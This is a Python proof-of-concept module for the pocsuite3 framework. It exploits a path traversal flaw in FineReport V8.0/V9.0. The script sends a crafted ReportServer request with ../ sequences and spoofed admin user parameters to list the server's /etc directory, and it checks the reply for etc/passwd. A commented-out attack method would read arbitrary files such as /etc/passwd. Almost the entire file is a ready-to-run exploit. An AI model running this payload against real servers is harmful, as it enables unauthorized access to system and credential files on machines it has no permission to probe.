#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pocsuite3.api import (
    minimum_version_required, POCBase, register_poc, requests, logger,
    OptString, OrderedDict,
    random_str,
)
from urllib.parse import urljoin
import os
minimum_version_required('2.0.2')


class DemoPOC(POCBase):
    vulID = '0'
    version = '1'
    author = 'xml'
    vulDate = '2023-03-23'
    createDate = '2023-03-23'
    updateDate = '2023-03-23'
    references = []
    name = 'FineReport(帆软)报表系统目录遍历漏洞'
    appPowerLink = ''
    appName = 'FineReport'
    appVersion = 'V8.0、V9.0'
    vulType = 'Path Traversal'
    desc = 'Vulnerability description'
    samples = ['']
    install_requires = ['']
    pocDesc = 'User manual of poc'
    dork = {'zoomeye': ''}
    suricata_request = ''
    suricata_response = ''
    severity='high'

    # def _options(self):
    #     o = OrderedDict()
    #     o['filepath'] = OptString('/etc/passwd', description='The full path to the file to read')
    #     return o

    def _exploit(self):

        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        apiurl="/WebReport/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=../../../../../../../../../../../../etc&currentUserName=admin&currentUserId=1&isWebReport=true"
        res=requests.get(url=urljoin(self.url,apiurl),allow_redirects=False)
        logger.debug(res.text)
        return res.text

    def _verify(self):
        result = {}
        res=self._exploit()
        if res and 'etc/passwd' in res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['info'] = {}
            result['VerifyInfo']['info']['Severity']=self.severity
            result['VerifyInfo']['info']['Result']=res.text
            result['VerifyInfo']['info']['file_name'] = os.path.basename(__file__)
        return self.parse_output(result)

    # def _attack(self):
    #     result = {}
    #     param = self.get_option('filepath')
    #     res = self._exploit(param)
    #     result['VerifyInfo'] = {}
    #     result['VerifyInfo']['URL'] = self.url
    #     result['VerifyInfo'][param] = res
    #     return self.parse_output(result)

    def _shell(self):
        return self._verify()


register_poc(DemoPOC)
